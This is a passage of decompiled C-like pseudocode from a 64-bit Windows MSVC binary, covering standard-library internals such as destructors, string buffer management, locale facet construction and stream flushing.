  sub_140006560((__int64)a1 + 72);
  sub_140006560((__int64)a1 + 56);
  sub_140006560((__int64)a1 + 40);
  sub_140006560((__int64)a1 + 24);
  sub_140006560((__int64)a1 + 8);
  std::_Lockit::~_Lockit(a1);
}


// ----- sub_140006B20 @ 0x140006b20 -----
__int64 __fastcall sub_140006B20(_QWORD *a1)
{
  __int64 result; // rax

  result = (__int64)a1;
  if ( a1[1] != 0 )
  {
    _castguard_slow_path_check_nop();
    return sub_14000AA30(*a1, a1[1], a1[2]);
  }
  return result;
}


// ----- sub_140006B90 @ 0x140006b90 -----
__int64 __fastcall sub_140006B90(__int64 a1)
{
  __int64 result; // rax

  result = unknown_libname_41(*(int *)(**(_QWORD **)a1 + 4LL) + *(_QWORD *)a1);
  if ( result != 0 )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)result + 16LL))(result);
  return result;
}


// ----- sub_140006BF0 @ 0x140006bf0 -----
__int64 __fastcall sub_140006BF0(_QWORD *a1)
{
  __int64 result; // rax

  result = (__int64)a1;
  if ( a1[1] != 0 )
    return sub_14000AA30(*a1, a1[1], a1[2]);
  return result;
}


// ----- sub_140006C40 @ 0x140006c40 -----
__int64 __fastcall sub_140006C40(__int64 a1)
{
  return unknown_libname_69(a1);
}


// ----- unknown_libname_69 @ 0x140006c60 -----
// Microsoft VisualC v14 64bit runtime
void __fastcall unknown_libname_69(std::exception *a1)
{
  std::exception::~exception(a1);
}


// ----- ??1ios_base@std@@UEAA@XZ_1 @ 0x140006c80 -----
void __fastcall std::ios_base::~ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::codecvt_base::`vftable';
  std::ios_base::~ios_base(this);
}


// ----- ??1ios_base@std@@UEAA@XZ_2 @ 0x140006cb0 -----
void __fastcall std::ios_base::~ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::ctype_base::`vftable';
  std::ios_base::~ios_base(this);
}


// ----- ??1exception@std@@UEAA@XZ @ 0x140006ce0 -----
void __fastcall std::exception::~exception(std::exception *this)
{
  *(_QWORD *)this = &std::exception::`vftable';
  sub_140011250((char *)this + 8);
}


// ----- ??1ios_base@std@@UEAA@XZ_3 @ 0x140006d10 -----
void __fastcall std::ios_base::~ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::locale::facet::`vftable';
  sub_140006A50(this);
}


// ----- sub_140006D40 @ 0x140006d40 -----
__int64 __fastcall sub_140006D40(__int64 a1)
{
  return sub_140006EA0(a1);
}


// ----- sub_140006D60 @ 0x140006d60 -----
__int64 __fastcall sub_140006D60(__int64 a1)
{
  sub_14000A4C0(a1);
  return sub_140006850(a1);
}


// ----- ??1ios_base@std@@UEAA@XZ_4 @ 0x140006d90 -----
void __fastcall std::ios_base::~ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::ios_base::`vftable';
  sub_140010058(this);
}


// ----- sub_140006DC0 @ 0x140006dc0 -----
__int64 (__fastcall ***__fastcall sub_140006DC0(__int64 a1))(_QWORD, __int64)
{
  __int64 (__fastcall ***result)(_QWORD, __int64); // rax

  result = (__int64 (__fastcall ***)(_QWORD, __int64))a1;
  if ( *(_QWORD *)(a1 + 8) != 0 )
  {
    result = (__int64 (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 16LL))(*(_QWORD *)(a1 + 8));
    if ( result != nullptr )
      return (__int64 (__fastcall ***)(_QWORD, __int64))(**result)(result, 1);
  }
  return result;
}


// ----- sub_140006E30 @ 0x140006e30 -----
__int64 __fastcall sub_140006E30(__int64 a1)
{
  return sub_140006B90(a1);
}


// ----- sub_140006E50 @ 0x140006e50 -----
__int64 __fastcall sub_140006E50(_QWORD *a1)
{
  if ( (unsigned int)j___uncaught_exceptions() == 0 )
    sub_1400094D0(*a1);
  return sub_140006B90((__int64)a1);
}


// ----- sub_140006EA0 @ 0x140006ea0 -----
__int64 __fastcall sub_140006EA0(__int64 a1)
{
  return sub_140006C40(a1);
}


// ----- ??R_lambda_7224c10e0d9cf27ffd5accaa7469d6af_@@QEBA@_K@Z @ 0x140006ec0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall _lambda_7224c10e0d9cf27ffd5accaa7469d6af_::operator()(__int64 a1, __int64 a2)
{
  return a2;
}


// ----- sub_140006ED0 @ 0x140006ed0 -----
__int64 __fastcall sub_140006ED0(__int64 a1, __int64 a2)
{
  struct __crt_win32_buffer_empty_debug_info *v3; // [rsp+28h] [rbp-20h]
  void *v4; // [rsp+30h] [rbp-18h]

  if ( a1 != unknown_libname_71(a2) )
  {
    v4 = (void *)sub_140008610(a1);
    v3 = (struct __crt_win32_buffer_empty_debug_info *)sub_140008610(a2);
    sub_14000A000(a1);
    __crt_win32_buffer_no_resizing::deallocate(v4, v3);
    sub_140009A10(a1, a2);
  }
  return a1;
}


// ----- ??8error_category@std@@QEBA_NAEBV01@@Z @ 0x140006f50 -----
_BOOL8 __fastcall std::error_category::operator==(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+28h] [rbp-10h]

  v3 = std::_Bit_cast<unsigned __int64,std::error_category::_Addr_storage,0>(a1 + 8);
  return v3 == std::_Bit_cast<unsigned __int64,std::error_category::_Addr_storage,0>(a2 + 8);
}


// ----- ??8std@@YA_NAEBVerror_condition@0@0@Z @ 0x140006fb0 -----
__int64 __fastcall std::operator==(__crt_win32_buffer_debug_info *a1, __crt_win32_buffer_debug_info *a2)
{
  unsigned __int8 v3; // [rsp+20h] [rbp-28h]
  int v4; // [rsp+24h] [rbp-24h]
  const char *v5; // [rsp+28h] [rbp-20h]
  const char *v6; // [rsp+30h] [rbp-18h]

  v6 = __crt_win32_buffer_debug_info::file_name(a1);
  v5 = __crt_win32_buffer_debug_info::file_name(a2);
  v3 = false;
  if ( std::error_category::operator==((__int64)v6, (__int64)v5) )
  {
    v4 = `anonymous namespace'::_Transcode_result::_Error(a1);
    if ( v4 == (unsigned int)`anonymous namespace'::_Transcode_result::_Error(a2) )
      return true;
  }
  return v3;
}


// ----- ??B?$fpos@U_Mbstatet@@@std@@QEBA_JXZ @ 0x140007030 -----
__int64 __fastcall std::fpos<_Mbstatet>::operator __int64(_QWORD *a1)
{
  return a1[1] + *a1;
}


// ----- sub_140007050 @ 0x140007050 -----
_BOOL8 __fastcall sub_140007050(__int64 a1)
{
  return (unsigned __int8)sub_14000B3F0(a1) == 0;
}


// ----- ??B?$optional@_K@std@@QEBA_NXZ @ 0x140007090 -----
__int64 __fastcall std::optional<unsigned __int64>::operator bool(__int64 a1)
{
  return *(unsigned __int8 *)(a1 + 8);
}


// ----- sub_1400070A0 @ 0x1400070a0 -----
__int64 __fastcall sub_1400070A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  _BYTE v6[24]; // [rsp+20h] [rbp-18h] BYREF

  sub_14000A830(a1, a2, a3);
  sub_1400039A0(a3 + a1, a4, a5);
  v6[0] = 0;
  return unknown_libname_25(a5 + a3 + a1, v6);
}


// ----- sub_140007130 @ 0x140007130 -----
__int64 __fastcall sub_140007130(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  _WORD v6[12]; // [rsp+20h] [rbp-18h] BYREF

  sub_14000A8C0(a1, a2, a3);
  sub_1400039D0(a1 + 2 * a3, a4, a5);
  v6[0] = 0;
  return unknown_libname_26(a1 + 2 * (a5 + a3), v6);
}


// ----- sub_1400071B0 @ 0x1400071b0 -----
__int64 __fastcall sub_1400071B0(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  _BYTE v5[24]; // [rsp+20h] [rbp-18h] BYREF
  char v8; // [rsp+58h] [rbp+20h] BYREF

  v8 = a4;
  sub_14000A830(a1, a2, a3);
  unknown_libname_25(a3 + a1, &v8);
  v5[0] = 0;
  return unknown_libname_25(a1 + a3 + 1, v5);
}


// ----- sub_140007230 @ 0x140007230 -----
__int64 __fastcall sub_140007230(__int64 a1, __int64 (__fastcall ***a2)(_QWORD, __int64))
{
  __int64 result; // rax

  result = (__int64)a2;
  if ( a2 != nullptr )
    return (**a2)(a2, 1);
  return result;
}


// ----- ??_D?$basic_iostream@DU?$char_traits@D@std@@@std@@QEAAXXZ @ 0x140007290 -----
void __fastcall std::iostream::`vbase destructor'(__int64 a1)
{
  std::iostream::~iostream<char,std::char_traits<char>>(a1 + 32);
  std::ios_base::~ios_base((std::ios_base *)(a1 + 32));
}


// ----- sub_1400072D0 @ 0x1400072d0 -----
void __fastcall sub_1400072D0(__int64 a1)
{
  sub_140006690(a1 + 24);
  std::ios_base::~ios_base((std::ios_base *)(a1 + 24));
}


// ----- sub_140007310 @ 0x140007310 -----
void __fastcall sub_140007310(__int64 a1)
{
  sub_1400066E0(a1 + 168);
  std::ios_base::~ios_base((std::ios_base *)(a1 + 168));
}


// ----- sub_140007350 @ 0x140007350 -----
void __fastcall sub_140007350(__int64 a1)
{
  sub_140006770(a1 + 16);
  std::ios_base::~ios_base((std::ios_base *)(a1 + 16));
}


// ----- ??_D?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ @ 0x140007390 -----
void __fastcall std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vbase destructor'(
        __int64 a1)
{
  std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::~basic_stringstream<char,std::char_traits<char>,std::allocator<char>>(a1 + 152);
  std::ios_base::~ios_base((std::ios_base *)(a1 + 152));
}


// ----- sub_1400073C8 @ 0x1400073c8 -----
__int64 __fastcall sub_1400073C8(__int64 a1)
{
  return sub_140007490(a1 - *(int *)(a1 - 4));
}


// ----- sub_1400073D4 @ 0x1400073d4 -----
__int64 __fastcall sub_1400073D4(__int64 a1)
{
  return sub_1400074E0(a1 - *(int *)(a1 - 4));
}


// ----- sub_1400073E0 @ 0x1400073e0 -----
__int64 __fastcall sub_1400073E0(__int64 a1)
{
  return sub_140007530(a1 - *(int *)(a1 - 4));
}


// ----- sub_1400073EC @ 0x1400073ec -----
__int64 __fastcall sub_1400073EC(__int64 a1)
{
  return sub_140007590(a1 - *(int *)(a1 - 4));
}


// ----- sub_1400073F8 @ 0x1400073f8 -----
__int64 __fastcall sub_1400073F8(__int64 a1)
{
  return sub_140007660(a1 - *(int *)(a1 - 4));
}


// ----- sub_140007410 @ 0x140007410 -----
void *__fastcall sub_140007410(void *a1, char a2)
{
  sub_140006580((__int64)a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007450 @ 0x140007450 -----
std::ios_base *__fastcall sub_140007450(std::ios_base *a1, char a2)
{
  std::ios_base::~ios_base(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007490 @ 0x140007490 -----
__int64 __fastcall sub_140007490(__int64 a1, char a2)
{
  std::iostream::`vbase destructor'(a1 - 32);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base((void *)(a1 - 32));
  return a1 - 32;
}


// ----- sub_1400074E0 @ 0x1400074e0 -----
__int64 __fastcall sub_1400074E0(__int64 a1, char a2)
{
  sub_1400072D0(a1 - 24);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base((void *)(a1 - 24));
  return a1 - 24;
}


// ----- sub_140007530 @ 0x140007530 -----
__int64 __fastcall sub_140007530(__int64 a1, char a2)
{
  sub_140007310(a1 - 168);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base((void *)(a1 - 168));
  return a1 - 168;
}


// ----- sub_140007590 @ 0x140007590 -----
__int64 __fastcall sub_140007590(__int64 a1, char a2)
{
  sub_140007350(a1 - 16);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base((void *)(a1 - 16));
  return a1 - 16;
}


// ----- sub_1400075E0 @ 0x1400075e0 -----
_QWORD *__fastcall sub_1400075E0(_QWORD *a1, char a2)
{
  sub_1400067C0(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007620 @ 0x140007620 -----
_QWORD *__fastcall sub_140007620(_QWORD *a1, char a2)
{
  sub_140006880(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007660 @ 0x140007660 -----
__int64 __fastcall sub_140007660(__int64 a1, char a2)
{
  std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vbase destructor'(a1 - 152);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base((void *)(a1 - 152));
  return a1 - 152;
}


// ----- sub_1400076C0 @ 0x1400076c0 -----
std::ios_base *__fastcall sub_1400076C0(std::ios_base *a1, char a2)
{
  std::ios_base::~ios_base(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007700 @ 0x140007700 -----
std::ios_base *__fastcall sub_140007700(std::ios_base *a1, char a2)
{
  sub_140006980(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007740 @ 0x140007740 -----
_QWORD *__fastcall sub_140007740(_QWORD *a1, char a2)
{
  sub_140006A50(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007780 @ 0x140007780 -----
void *__fastcall sub_140007780(void *a1, char a2)
{
  sub_140006A70();
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_1400077C0 @ 0x1400077c0 -----
void *__fastcall sub_1400077C0(void *a1, char a2)
{
  sub_140006C40((__int64)a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007800 @ 0x140007800 -----
std::exception *__fastcall sub_140007800(std::exception *a1, char a2)
{
  unknown_libname_69(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007840 @ 0x140007840 -----
void *__fastcall sub_140007840(void *a1, char a2)
{
  sub_140006C40((__int64)a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007880 @ 0x140007880 -----
std::ios_base *__fastcall sub_140007880(std::ios_base *a1, char a2)
{
  std::ios_base::~ios_base(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_1400078C0 @ 0x1400078c0 -----
std::ios_base *__fastcall sub_1400078C0(std::ios_base *a1, char a2)
{
  std::ios_base::~ios_base(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007900 @ 0x140007900 -----
std::exception *__fastcall sub_140007900(std::exception *a1, char a2)
{
  std::exception::~exception(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007940 @ 0x140007940 -----
std::ios_base *__fastcall sub_140007940(std::ios_base *a1, char a2)
{
  std::ios_base::~ios_base(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007980 @ 0x140007980 -----
void *__fastcall sub_140007980(void *a1, char a2)
{
  sub_140006D40((__int64)a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_1400079C0 @ 0x1400079c0 -----
std::ios_base *__fastcall sub_1400079C0(std::ios_base *a1, char a2)
{
  std::ios_base::~ios_base(a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007A00 @ 0x140007a00 -----
void *__fastcall sub_140007A00(void *a1, char a2)
{
  sub_140006DC0((__int64)a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- sub_140007A40 @ 0x140007a40 -----
void *__fastcall sub_140007A40(void *a1, char a2)
{
  sub_140006EA0((__int64)a1);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(a1);
  return a1;
}


// ----- ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAXXZ @ 0x140007a80 -----
unsigned __int64 __fastcall std::_String_val<std::_Simple_types<char>>::_Activate_SSO_buffer(__int64 a1)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+20h] [rbp-18h]

  result = (unsigned __int8)sub_1400092F0(a1);
  if ( (_BYTE)result != 0 )
  {
    for ( i = 0; i < 0x10; ++i )
    {
      *(_BYTE *)(i + a1) = 0;
      result = i + 1;
    }
  }
  return result;
}


// ----- ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ @ 0x140007ad0 -----
unsigned __int64 __fastcall std::_String_val<std::_Simple_types<wchar_t>>::_Activate_SSO_buffer(__int64 a1)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+20h] [rbp-18h]

  result = (unsigned __int8)sub_1400092F0(a1);
  if ( (_BYTE)result != 0 )
  {
    for ( i = 0; i < 8; ++i )
    {
      *(_WORD *)(a1 + 2 * i) = 0;
      result = i + 1;
    }
  }
  return result;
}


// ----- sub_140007B20 @ 0x140007b20 -----
_QWORD *__fastcall sub_140007B20(_QWORD *a1, _QWORD *a2)
{
  __int64 v3; // [rsp+8h] [rbp-20h]

  *a2 += 39LL;
  v3 = *(_QWORD *)(*a1 - 8LL);
  if ( (unsigned __int64)(*a1 - v3) < 8 || (unsigned __int64)(*a1 - v3) > 0x27 )
    __fastfail(5u);
  *a1 = v3;
  return a1;
}


// ----- sub_140007BB0 @ 0x140007bb0 -----
void *__fastcall sub_140007BB0(size_t a1)
{
  return operator new(a1);
}


// ----- sub_140007BD0 @ 0x140007bd0 -----
__int64 __fastcall sub_140007BD0(__int64 a1, unsigned __int64 a2)
{
  if ( a2 > std::_Tree<std::_Tmap_traits<void *,`anonymous namespace'::_Mutex_count_pair,std::less<void *>,std::_Crt_allocator<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>,0>>::max_size(a1) )
    sub_14000A120();
  return sub_140007C10(a1, a2);
}


// ----- sub_140007C10 @ 0x140007c10 -----
__int64 __fastcall sub_140007C10(__int64 *a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 result; // rax
  __int64 *v6; // [rsp+38h] [rbp-20h]
  __int64 *v7; // [rsp+40h] [rbp-18h]
  __int64 v8; // [rsp+68h] [rbp+10h] BYREF

  v8 = a2;
  v6 = a1 + 1;
  v7 = a1 + 2;
  v2 = sub_140008610(a1);
  v3 = __crt_char_traits<char>::set_environment_variable<char const (&)[4],char const * const &>(v2, &v8);
  *a1 = v3;
  *v6 = v3;
  result = v3 + 4 * v8;
  *v7 = result;
  return result;
}


// ----- unknown_libname_17 @ 0x140007ca0 -----
// Microsoft VisualC v14 64bit runtime
void *__fastcall unknown_libname_17(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 8) != 0 )
    return (void *)unknown_libname_27(*(_QWORD *)(a1 + 8) + 40LL);
  else
    return &unk_14008C378;
}


// ----- sub_140007CF0 @ 0x140007cf0 -----
__int64 __fastcall sub_140007CF0(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-18h]

  v3 = std::string::shrink_to_fit(a1);
  return sub_140007D40(a2, *(_QWORD *)(a1 + 24), v3);
}


// ----- sub_140007D40 @ 0x140007d40 -----
unsigned __int64 __fastcall sub_140007D40(__int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // [rsp+20h] [rbp-28h] BYREF
  __int64 v5; // [rsp+28h] [rbp-20h] BYREF

  v5 = a1 | 0xF;
  if ( (a1 | 0xFuLL) > a3 )
    return a3;
  if ( a2 > a3 - a2 / 2 )
    return a3;
  v4 = a2 / 2 + a2;
  return *unknown_libname_10(&v5, &v4);
}


// ----- sub_140007DF0 @ 0x140007df0 -----
__int64 __fastcall sub_140007DF0(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-18h]

  v3 = std::string::shrink_to_fit(a1);
  return sub_140007E40(a2, *(_QWORD *)(a1 + 24), v3);
}


// ----- sub_140007E40 @ 0x140007e40 -----
unsigned __int64 __fastcall sub_140007E40(__int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // [rsp+20h] [rbp-28h] BYREF
  __int64 v5; // [rsp+28h] [rbp-20h] BYREF

  v5 = a1 | 7;
  if ( (a1 | 7uLL) > a3 )
    return a3;
  if ( a2 > a3 - a2 / 2 )
    return a3;
  v4 = a2 / 2 + a2;
  return *unknown_libname_10(&v5, &v4);
}


// ----- sub_140007EF0 @ 0x140007ef0 -----
__int64 __fastcall sub_140007EF0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // [rsp+20h] [rbp-28h]

  v3 = sub_14000A480(a1);
  std::_Tree<std::_Tmap_traits<void *,`anonymous namespace'::_Mutex_count_pair,std::less<void *>,std::_Crt_allocator<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>,0>>::max_size(a1);
  if ( v3 > 0x7FFFFFFFFFFFFFFFLL - v3 / 2 )
    return 0x7FFFFFFFFFFFFFFFLL;
  if ( v3 / 2 + v3 >= a2 )
    return v3 / 2 + v3;
  return a2;
}


// ----- sub_140007F90 @ 0x140007f90 -----
__int64 __fastcall sub_140007F90(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // [rsp+30h] [rbp-28h]
  _QWORD *v6; // [rsp+40h] [rbp-18h]

  v5 = sub_140008610(a1);
  v6 = a1 + 2;
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  if ( *a1 != 0 )
  {
    _castguard_slow_path_check_nop();
    sub_14000AA30(v5, *a1, *v6 - *a1);
  }
  *a1 = a2;
  a1[1] = a3 + a2;
  *v6 = a4 + a2;
  return a4 + a2;
}


// ----- sub_140008090 @ 0x140008090 -----
__int64 __fastcall sub_140008090(__int64 a1, unsigned __int64 a2)
{
  __int64 result; // rax

  result = a1;
  if ( *(_QWORD *)(a1 + 16) < a2 )
    sub_14000A140();
  return result;
}


// ----- ?_Clamp_suffix_size@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_K_K0@Z @ 0x1400080c0 -----
__int64 __fastcall std::_String_val<std::_Simple_types<char>>::_Clamp_suffix_size(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+20h] [rbp-18h] BYREF
  __int64 v5; // [rsp+50h] [rbp+18h] BYREF

  v5 = a3;
  v4[0] = *(_QWORD *)(a1 + 16) - a2;
  return *unknown_libname_12(&v5, v4);
}


// ----- sub_140008100 @ 0x140008100 -----
__int64 __fastcall sub_140008100(void *a1)
{
  char v2; // [rsp+20h] [rbp-18h] BYREF
  _BYTE v3[7]; // [rsp+21h] [rbp-17h] BYREF
  void *v4; // [rsp+28h] [rbp-10h]

  v4 = a1;
  sub_140008610(a1);
  v2 = __crt_fast_encode_pointer();
  __crt_win32_buffer_no_resizing::deallocate(v4, (const struct __crt_win32_buffer_empty_debug_info *)&v2);
  *((_QWORD *)v4 + 2) = 0;
  *((_QWORD *)v4 + 3) = 15;
  std::_String_val<std::_Simple_types<char>>::_Activate_SSO_buffer((__int64)v4);
  v3[0] = 0;
  return unknown_libname_25(v4, v3);
}


// ----- sub_140008190 @ 0x140008190 -----
__int64 __fastcall sub_140008190(void *a1)
{
  _BYTE v2[2]; // [rsp+20h] [rbp-18h] BYREF
  __int16 v3; // [rsp+22h] [rbp-16h] BYREF
  void *v4; // [rsp+28h] [rbp-10h]

  v4 = a1;
  sub_140008610(a1);
  v2[0] = __crt_fast_encode_pointer();
  __crt_win32_buffer_no_resizing::deallocate(v4, (const struct __crt_win32_buffer_empty_debug_info *)v2);
  *((_QWORD *)v4 + 2) = 0;
  *((_QWORD *)v4 + 3) = 7;
  std::_String_val<std::_Simple_types<wchar_t>>::_Activate_SSO_buffer((__int64)v4);
  v3 = 0;
  return unknown_libname_26(v4, &v3);
}


// ----- sub_140008220 @ 0x140008220 -----
__int64 __fastcall sub_140008220(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_14000AA30(a1, a2, a3 + 1);
}


// ----- ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z @ 0x140008260 -----
__int64 __fastcall std::wstring::_Deallocate_for_capacity(__int64 a1, __int64 a2, __int64 a3)
{
  return std::allocator<wchar_t>::deallocate(a1, a2, a3 + 1);
}


// ----- ?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ @ 0x1400082a0 -----
struct std::_Facet_base *__fastcall std::locale::facet::_Decref(std::locale::facet *this)
{
  if ( _InterlockedDecrement((volatile signed __int32 *)this + 2) != 0 )
    return nullptr;
  else
    return this;
}


// ----- sub_1400082D0 @ 0x1400082d0 -----
bool __fastcall sub_1400082D0(__int64 a1)
{
  int v2; // [rsp+30h] [rbp-78h]
  unsigned int v3; // [rsp+38h] [rbp-70h]
  unsigned int v4; // [rsp+3Ch] [rbp-6Ch]
  unsigned int v5; // [rsp+40h] [rbp-68h]
  size_t ElementCount; // [rsp+48h] [rbp-60h]
  __int64 (__fastcall *v7)(__int64, _QWORD); // [rsp+50h] [rbp-58h]
  _BYTE *v8; // [rsp+68h] [rbp-40h] BYREF
  _BYTE Buffer[32]; // [rsp+70h] [rbp-38h] BYREF
  char v10; // [rsp+90h] [rbp-18h] BYREF

  if ( *(_QWORD *)(a1 + 104) == 0 || *(_BYTE *)(a1 + 113) == 0 )
    return true;
  v7 = *(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 24LL);
  v3 = sub_14000B200();
  v4 = v7(a1, v3);
  v5 = sub_14000B200();
  if ( (unsigned __int8)std::_Narrow_char_traits<char,int>::eq_int_type(v5, v4) != 0 )
    return false;
  v2 = sub_14000E590(*(_QWORD *)(a1 + 104), (int)a1 + 116, (unsigned int)Buffer, (unsigned int)&v10, (__int64)&v8);
  if ( v2 != 0 )
  {
    if ( v2 != 1 )
    {
      if ( v2 != 3 )
        return false;
      *(_BYTE *)(a1 + 113) = 0;
      return true;
    }
  }
  else
  {
    *(_BYTE *)(a1 + 113) = 0;
  }
  return (v8 == Buffer || (ElementCount = v8 - Buffer) == fwrite(Buffer, 1u, ElementCount, *(FILE **)(a1 + 128)))
      && *(_BYTE *)(a1 + 113) == 0;
}


// ----- sub_140008490 @ 0x140008490 -----
__int64 __fastcall sub_140008490(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _BYTE v4[24]; // [rsp+20h] [rbp-18h] BYREF

  *(_QWORD *)(a1 + 16) = a2;
  v4[0] = 0;
  v2 = unknown_libname_21(a1);
  return unknown_libname_25(a2 + v2, v4);
}


// ----- sub_1400084E0 @ 0x1400084e0 -----
bool __fastcall sub_1400084E0(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-28h]
  __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]

  v3 = sub_14000BBC0(a2);
  v4 = *(_QWORD *)(a1 + 16);
  v5 = unknown_libname_21(a1);
  return sub_140003A00(v5, v4, a2, v3);
}


// ----- ?_Erase_noexcept@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV12@_K_K@Z @ 0x140008540 -----
__int64 __fastcall std::string::_Erase_noexcept(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // [rsp+38h] [rbp-20h]
  __int64 v5; // [rsp+40h] [rbp-18h]
  __int64 v8; // [rsp+70h] [rbp+18h]

  v8 = std::_String_val<std::_Simple_types<char>>::_Clamp_suffix_size(a1, a2, a3);
  v5 = *(_QWORD *)(a1 + 16);
  v4 = unknown_libname_21(a1);
  sub_14000C160(a2 + v4, v8 + a2 + v4, v5 - v8 - a2 + 1);
  *(_QWORD *)(a1 + 16) = v5 - v8;
  return a1;
}


// ----- sub_140008610 @ 0x140008610 -----
__int64 __fastcall sub_140008610(__int64 a1)
{
  return unknown_libname_71(a1);
}


// ----- sub_140008630 @ 0x140008630 -----
__int64 __fastcall sub_140008630(_QWORD *a1, __int64 a2)
{
  const char *v2; // rax
  char v4; // [rsp+20h] [rbp-A8h]
  _QWORD *v5; // [rsp+28h] [rbp-A0h]
  _QWORD *v6; // [rsp+30h] [rbp-98h]
  std::_Locinfo *v7; // [rsp+48h] [rbp-80h]
  _BYTE v8[112]; // [rsp+58h] [rbp-70h] BYREF

  v4 = 0;
  if ( a1 != nullptr && *a1 == 0 )
  {
    v5 = operator new(0x10u);
    if ( v5 != nullptr )
    {
      v2 = (const char *)unknown_libname_17(a2);
      v4 = 1;
      v7 = std::_Locinfo::_Locinfo((std::_Locinfo *)v8, v2);
      v6 = sub_140005590(v5, v7, 0);
    }
    else
    {
      v6 = nullptr;
    }
    *a1 = v6;
    if ( (v4 & 1) != 0 )
      sub_140006A90((struct std::_Locinfo *)v8);
  }
  return 2;
}


// ----- sub_140008730 @ 0x140008730 -----
__int64 __fastcall sub_140008730(_QWORD *a1, __int64 a2)
{
  const char *v2; // rax
  char v4; // [rsp+20h] [rbp-A8h]
  _QWORD *v5; // [rsp+28h] [rbp-A0h]
  _QWORD *v6; // [rsp+30h] [rbp-98h]
  std::_Locinfo *v7; // [rsp+48h] [rbp-80h]
  _BYTE v8[112]; // [rsp+58h] [rbp-70h] BYREF

  v4 = 0;
  if ( a1 != nullptr && *a1 == 0 )
  {
    v5 = operator new(0x30u);
    if ( v5 != nullptr )
    {
      v2 = (const char *)unknown_libname_17(a2);
      v4 = 1;
      v7 = std::_Locinfo::_Locinfo((std::_Locinfo *)v8, v2);
      v6 = sub_1400055E0(v5, (__int64)v7, 0);
    }
    else
    {
      v6 = nullptr;
    }
    *a1 = v6;
